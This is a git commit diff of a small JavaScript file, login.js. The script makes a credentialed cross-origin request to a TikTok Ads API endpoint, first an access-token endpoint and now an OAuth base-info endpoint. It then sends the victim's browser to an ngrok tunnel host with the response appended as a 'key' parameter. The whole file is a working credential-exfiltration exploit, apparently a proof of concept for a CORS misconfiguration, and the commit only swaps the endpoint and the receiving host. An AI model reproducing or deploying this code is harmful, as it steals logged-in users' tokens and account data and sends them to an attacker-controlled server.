b56432deeda728af0887d8514b816ffcc22ce553
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-25 10:40:38 +0700

    Update login.js

--- login.js
+++ login.js
@@ -1,11 +1,11 @@
 var xhr = new XMLHttpRequest();
 
 xhr.onload = reqListener; 
-xhr.open("GET", "https://ads.tiktok.com/api/v1/self-serve/athena/access_token/");
+xhr.open("GET", "https://ads.tiktok.com/ac/api/v1/oauth/tt_oauth_base_info?msToken=8OLXQsITlBMGlv_JTV-1nOiVJUQ-I-2RB3uVh9YzJWSDTWWkQRK2tUgF4kn5IoBdg8rf5NYNNiJquWQonJQYOmR4Aa4nbaOjC5ZWzcaraobpiToTKSNRYW2bqbXY6TDHlfc=&X-Bogus=DFSzsIVOKokANHbAtxrWi0WdbTLk&_signature=_02B4Z6wo00001Xdm9DgAAIDBXR8MrXfTMgV3Z.CAADk177");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/json");
 xhr.send();
 
 function reqListener() {
-    location='//dc1b-202-162-37-174.ngrok-free.app//?key='+this.responseText; 
+    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
 };
